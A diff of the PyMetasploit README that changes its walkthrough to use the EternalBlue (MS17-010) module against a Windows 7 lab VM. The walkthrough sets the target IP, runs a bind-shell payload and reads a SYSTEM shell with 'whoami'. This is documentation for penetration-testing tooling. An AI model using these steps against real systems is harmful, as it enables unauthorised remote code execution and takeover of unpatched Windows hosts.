@@ -65,6 +65,8 @@ Let's get started interacting with the Metasploit framework from python:
 ```python
 >>> from metasploit.msfrpc import MsfRpcClient
 >>> client = MsfRpcClient('mypassword')
+or
+>>> client = MsfRpcClient('mypassword', server="127.0.0.1", port="55553", username="msf", ssl=False)
 ```
 
 The `MsfRpcClient` class provides the core functionality to navigate through the Metasploit framework. Let's take a
@@ -72,8 +74,7 @@ look at its underbelly:
 
 ```python
 >>> [m for m in dir(client) if not m.startswith('_')]
-['auth', 'authenticated', 'call', 'client', 'consoles', 'core', 'db', 'jobs', 'login', 'logout', 'modules', 'plugins',
-'port', 'server', 'sessionid', 'sessions', 'ssl', 'uri']
+['auth', 'authenticated', 'call', 'client', 'consoles', 'core', 'db', 'jobs', 'login', 'logout', 'modules', 'plugins', 'port', 'server', 'sessionid', 'sessions', 'ssl', 'uri', 'verify_ssl']
 >>>
 ```
 
@@ -94,9 +95,8 @@ what exploits are currently loaded:
 
 ```python
 >>> client.modules.exploits
-['windows/wins/ms04_045_wins', 'windows/winrm/winrm_script_exec', 'windows/vpn/safenet_ike_11',
-'windows/vnc/winvnc_http_get', 'windows/vnc/ultravnc_viewer_bof', 'windows/vnc/ultravnc_client', ...
-'aix/rpc_ttdbserverd_realpath', 'aix/rpc_cmsd_opcode21']
+['hpux/lpd/cleanup_exec', 'dialup/multi/login/manyargs', 'aix/rpc_ttdbserverd_realpath', 'aix/rpc_cmsd_opcode21', 'aix/local/ibstat_path', ...
+'android/fileformat/adobe_reader_pdf_js_interface', 'linux/smtp/haraka']
 >>>
 ```
 
@@ -118,7 +118,7 @@ We can also retrieve a list of `auxiliary`, `encoders`, `nops`, `payloads`, and 
 Now let's interact with one of the `exploit` modules:
 
 ```python
->>> exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
+>>> exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
 >>>
 ```
 
@@ -126,30 +126,26 @@ If all is well at this point, you will be able to query the module for various p
 description, required run-time options, etc. Let's take a look:
 
 ```python
->>>  print exploit.description
+>>>  print(exploit.description)
 
-          This module exploits a malicious backdoor that was added to the	VSFTPD download
-          archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between
-          June 30th 2011 and July 1st 2011 according to the most recent information
-          available. This backdoor was removed on July 3rd 2011.
+This module is a port of the Equation Group ETERNALBLUE exploit, part of the FuzzBunch toolkit released by Shadow Brokers. There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later completed in srvnet!SrvNetWskReceiveComplete. This exploit, like the original may not trigger 100% of the time, and should be run continuously until triggered. It seems like the pool will get hot streaks and need a cool down period before the shells rain in again. The module will attempt to use Anonymous login, by default, to authenticate to perform the exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use those instead. On some systems, this module may cause system instability and crashes, such as a BSOD or a reboot. This may be more likely with some payloads.
 
 >>> exploit.authors
-['hdm <hdm@metasploit.com>', 'MC <mc@metasploit.com>']
+[b'Sean Dillon <sean.dillon@risksense.com>', b'Dylan Davis <dylan.davis@risksense.com>', b'Equation Group', b'Shadow Brokers', b'thelightcosine']
 >>> exploit.options
-['TCP::send_delay', 'ConnectTimeout', 'SSLVersion', 'VERBOSE', 'SSLCipher', 'CPORT', 'SSLVerifyMode', 'SSL', 'WfsDelay',
-'CHOST', 'ContextInformationFile', 'WORKSPACE', 'EnableContextEncoding', 'TCP::max_send_size', 'Proxies',
-'DisablePayloadHandler', 'RPORT', 'RHOST']
+dict_keys(['TCP::send_delay', 'EnableContextEncoding', 'MaxExploitAttempts', 'GroomAllocations', 'SSLVerifyMode', 'RPORT', 'DCERPC::fake_bind_multi_append', 'SMBUser', 'DCERPC::smb_pipeio', 'DCERPC::fake_bind_multi_prepend', 'VerifyArch', 'ContextInformationFile', 'DCERPC::ReadTimeout', 'ConnectTimeout', 'GroomDelta', 'DCERPC::fake_bind_multi', 'TCP::max_send_size', 'SSLCipher', 'CHOST', 'RHOST', 'SMBPass', 'Proxies', 'SMBDomain', 'VerifyTarget', 'WfsDelay', 'WORKSPACE', 'DisablePayloadHandler', 'SSLVersion', 'VERBOSE', 'DCERPC::max_frag_size', 'ProcessName', 'CPORT', 'SSL'])
 >>> exploit.required # Required options
-['ConnectTimeout', 'RPORT', 'RHOST']
+['MaxExploitAttempts', 'GroomAllocations', 'RPORT', 'VerifyArch', 'DCERPC::ReadTimeout', 'ConnectTimeout', 'GroomDelta', 'RHOST', 'VerifyTarget', 'SSLVersion', 'DCERPC::max_frag_size', 'ProcessName']
 ```
 
-That's all fine and dandy but you're probably really itching to pop a box with this library right now, amiright!? Let's
+~~That's all fine and dandy but you're probably really itching to pop a box with this library right now, amiright!? Let's
 do it! Let's use a [Metasploitable 2](http://sourceforge.net/projects/metasploitable/) instance running on a VMWare
 machine as our target. Luckily it's running our favorite version of vsFTPd - 2.3.4 - and we already have our exploit
-module loaded in PyMetasploit. Our next step is to specify our target:
+module loaded in PyMetasploit. Our next step is to specify our target:~~  
+The victim is "win7x64 pro sp1". You can also try it on x86 vm - https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/
 
 ```python
->>> exploit['RHOST'] = '172.16.14.145' # IP of our target host
+>>> exploit['RHOST'] = '192.168.1.11' # IP of our target host
 >>>
 ```
 
@@ -169,15 +165,16 @@ Awesome! So now we're ready to execute our exploit. All we need to do is select 
 
 ```python
 >>> exploit.payloads
-['cmd/unix/interact']
+['generic/custom', 'generic/shell_bind_tcp', ...
+, 'windows/x64/vncinject/reverse_winhttps']
 >>>
 ```
 
-At this point, this exploit only supports one payload (`cmd/unix/interact`). So let's pop a shell:
+At this point, this exploit only supports one payload (`generic/shell_bind_tcp`). So let's pop a shell:
 
 ```python
->>> exploit.execute(payload='cmd/unix/interact')
-{'job_id': 1, 'uuid': '3whbuevf'}
+>>> exploit.execute(payload='generic/shell_bind_tcp')
+{'uuid': 'cyjpfhww', 'job_id': 0}
 >>>
 ```
 
@@ -188,10 +185,7 @@ and if we managed to pop our box, we might see something nice in the sessions li
 
 ```python
 >>> client.sessions.list
-{1: {'info': '', 'username': 'ndouba', 'session_port': 21, 'via_payload': 'payload/cmd/unix/interact',
-'uuid': '5orqnnyv', 'tunnel_local': '172.16.14.1:58429', 'via_exploit': 'exploit/unix/ftp/vsftpd_234_backdoor',
-'exploit_uuid': '3whbuevf', 'tunnel_peer': '172.16.14.145:6200', 'workspace': 'false', 'routes': '',
-'target_host': '172.16.14.145', 'type': 'shell', 'session_host': '172.16.14.145', 'desc': 'Command shell'}}
+{'1': {'session_port': 445, 'exploit_uuid': 'cyjpfhww', 'username': 'root', 'type': 'shell', 'desc': 'Command shell', 'via_payload': 'payload/generic/shell_bind_tcp', 'uuid': 'bkttoqtn', 'workspace': 'false', 'routes': '', 'tunnel_peer': '192.168.1.11:4444', 'session_host': '192.168.1.11', 'info': 'Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation.  All rights reserved. C:\\Windows\\system32>', 'tunnel_local': '192.168.1.21:33391', 'target_host': '192.168.1.11', 'via_exploit': 'exploit/windows/smb/ms17_010_eternalblue', 'arch': 'x64'}}
 >>>
 ```
 
@@ -199,10 +193,16 @@ Success! We managed to pop the box! `client.sessions.list` shows us that we have
 the one we received when executing the module earlier (`exploit.execute()`). Let's interact with the shell:
 
 ```python
->>> shell = client.sessions.session(1)
+>>> shell = client.sessions.session("1")
 >>> shell.write('whoami\n')
->>> print shell.read()
-root
+>>> print(shell.read())
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>
 >>> # Happy dance!
 ```
 
